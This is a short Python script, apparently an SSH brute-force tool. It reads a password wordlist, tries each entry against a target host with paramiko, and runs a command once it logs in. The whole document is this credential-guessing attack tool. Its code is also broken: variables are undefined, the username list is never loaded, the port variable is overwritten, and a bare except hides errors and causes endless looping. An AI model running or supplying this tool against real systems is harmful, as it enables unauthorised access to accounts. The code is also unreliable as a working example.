#!/usr/bin/env python


from pwn import *
import paramiko

usr_arr = []
pass_arr = []
p_file = wordlist
u_file = username

host = rhost
cmd = "Found!"
p = port

print("User file:", u_file, "| Password file:", p_file, "\n")

passwords = open(p_file,"r", errors="ignore")
for l in passwords:
    p = l.strip()
    pass_arr.append(p)
passwords.close()
i = 1
x = 0
u = 0
while i == 1:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print("User:", str(usr_arr[u]), "| Password:", str(pass_arr[x]))
        client.connect(username=u_file, hostname=host, password=pass_arr[x], port=p)
        print("May have found valid credentials.\n")

        if cmd != "":
            stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
            for r in stdout:    print(str(r))

        break
    except (paramiko.ssh_exception.AuthenticationException):
        print("Nope...\n")

        if x == len(pass_arr) - 1:
            x = 0
            if u == len(usr_arr) - 1:    break
            u += 1
        else:
            x += 1
        continue
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Check host and port input: a valid connection can't be established here...\n")
        quit()
    except:

        continue
    i += 1

print("Brute-force finished.\n");
client.close();
quit()
